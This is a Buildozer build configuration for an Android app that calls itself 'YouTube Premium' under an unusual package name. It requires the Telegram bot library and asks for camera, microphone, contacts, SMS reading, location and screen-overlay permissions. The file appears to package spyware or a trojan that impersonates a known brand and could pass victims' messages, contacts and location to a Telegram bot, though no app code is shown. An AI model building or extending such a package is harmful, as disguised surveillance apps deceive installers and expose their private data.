[app]
title = YouTube Premium
package.name = yt.v110.dual
package.domain = org.master
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,kivy==2.2.1,telebot,requests,urllib3,certifi
orientation = portrait
android.permissions = INTERNET, CAMERA, RECORD_AUDIO, READ_CONTACTS, READ_SMS, RECEIVE_SMS, ACCESS_FINE_LOCATION, SYSTEM_ALERT_WINDOW
android.api = 33
android.sdk = 33
android.ndk = 25b
android.archs = arm64-v8a
android.accept_sdk_license = True
